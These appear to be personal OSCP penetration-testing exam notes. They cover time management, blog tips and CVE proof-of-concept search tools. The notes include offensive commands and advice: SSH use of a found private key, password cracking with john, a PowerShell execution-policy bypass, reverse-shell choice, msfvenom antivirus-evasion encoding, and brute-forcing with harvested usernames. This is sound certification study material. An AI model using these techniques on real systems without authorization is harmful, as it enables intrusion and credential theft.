# OSCP Exam Strategy


## Warning Signs You Need a Break

Making the same mistake repeatedly indicates fatigue. Frustration or anger building means you need distance. Tunnel vision on a single approach limits creativity. Physical discomfort like eye strain or back pain reduces effectiveness. Trust these warning signs and take breaks.

## When You Are Stuck: 30-Minute Protocol

Step back and re-read all your notes. Try a different approach from your methodology. Google the specific error or issue. Ask yourself what you might be missing. Sometimes the answer is in information you already have.

## When You Are Stuck: 1-Hour Protocol

Switch to a different machine temporarily. Review your methodology checklist for missed steps. Try manual verification of automated tool results. Consider privilege escalation vectors if you already have user access. Fresh perspective often reveals what you missed.

## When You Are Stuck: 2-Hour Protocol

Take a mandatory 15-30 minute break away from computer. Start completely fresh on a different target. Document everything you have tried in detail. Plan return strategy with specific new approaches to try. This prevents wasting time repeating failed methods.

---

# Article Notes
Miscellaneous practical tips for the exam, from various blogs.

##  OSCP Exam Secrets — Avoiding Rabbit Holes and Staying on Track (Part 2)

https://infosecwriteups.com/oscp-exam-secrets-avoiding-rabbit-holes-and-staying-on-track-part-2-c5192aee6ae7

- LFI is good for information disclosure, but also a good vector to RCE via log poisoning or PHP stream wrappers
- Checklist for after finding a private key, id_rsa
	- `ssh -i id_rsa user@TARGET -p PORT -o IdentitiesOnly=yes -o BatchMode=yes -vvv`
	- Check password protection: `ssh-keygen -y -f id_rsa >/dev/null && echo “no passphrase” || echo “passphrase-protected or invalid”`
	- If password protected, use ssh2john and crack
	- If ssh complains about libcrypto or key format, normalize the file: `dos2unix id_rsa` then `vim --clean id_rsa`
- Use RunasCs to switch users on Windows without having access to a GUI https://github.com/antonioCoco/RunasCs
- 
## Beyond the Shell: Advanced Enumeration and Privilege Escalation for OSCP (Part 3)

https://infosecwriteups.com/beyond-the-shell-advanced-enumeration-and-privilege-escalation-for-oscp-part-3-7410d3812d02

- When using a PHP reverse shell with a Windows target, use the PHP Ivan Sincek shell from revshells.com
	- reliable and often gives access as a Service User, which will usually have SeImpersonatePrivilege
- For Windows automated privesc, start with PrivescCheck.ps1 (clean and accurate results) https://github.com/itm4n/PrivescCheck
	- `powershell -ep bypass -c “. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML”`
- Just use john with rockyou for cracking, don't worry about hashcat or other lists
	- If there's an "About Us" page on a target website, use username anarchy / cupp / cewl to generate a custom wordlist
		- `cewl http://testphp.vulnweb.com -w test.txt`
		- `cewl http://testphp.vulnweb.com/artists.php --with-numbers`
	- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
	- Password protected zips and kbdx files are likely meant to be cracked. Use zip2john or kbdx2john 
- Clock Skew
	- "KRB_AP_ERR_SKEW(Clock skew too great)." when using attacks involving Kerberos
	- Use `ntpdate` or `rdate` on kali system to sync local time to the DC
- AV evasion
	- encode msfvenom payloads with x86/shikata_ga_nai or x64/xor_dynamic with multiple iterations (-i) to change the signature
- FTP/SMB
	- When there is FTP or SMB, check for anon/default creds immediately
	- Try to enumerate/discover usernames. Then use the discovered names to brute force web pages or SSH
	- Try strange file/dir names as usernames/passwords across other systems
- Don't hesitate to revert a machine if something doesn't work
- File transfer basics
	- Linux: 
		- Serve: `python3 -m http.server 80`
		- Download: `curl http://<Kali-IP>/file.bin -o file.bin`
	- Windows: 
		- Serve: `impacket-smbserver`
		- Upload/download from Windows: use `copy`

# Tooling To Help Hunt Down POCs For Vulnerable CVEs Beyond Searchsploit
## searchsploit
`searchsploit -u`

...

## Vulnx

`go install github.com/projectdiscovery/cvemap/cmd/vulnx@latest`

Add to PATH if not present
in bashrc, zsh etc
`export PATH=/home/username/go/bin/:$PATH`

Create account on
 https://cloud.projectdiscovery.io

Auth with API key
`vulnx auth`

```
vulnx version
vulnx healthcheck
```

`vulnx search "form tools 3.1.1"`

`--detailed`

`vulnx id <CVE>`

## Search_Vulns

```
git clone https://github.com/ra1nb0rn/search_vulns
cd ./search_vulns
docker build -t "new-docker-name" .
docker build -t search_vulns .

docker run -it "docker-name" bash
docker run -it search_vulns bash
```

search_vulns.py print help and update

```
python3 ./search_vulns.py -h
./search_vulns.py -h

./search_vulns.py -u
./search_vulns.py --full-update
```

 query search_vulns

`./search_vulns.py -q "CVE-2024-22722"`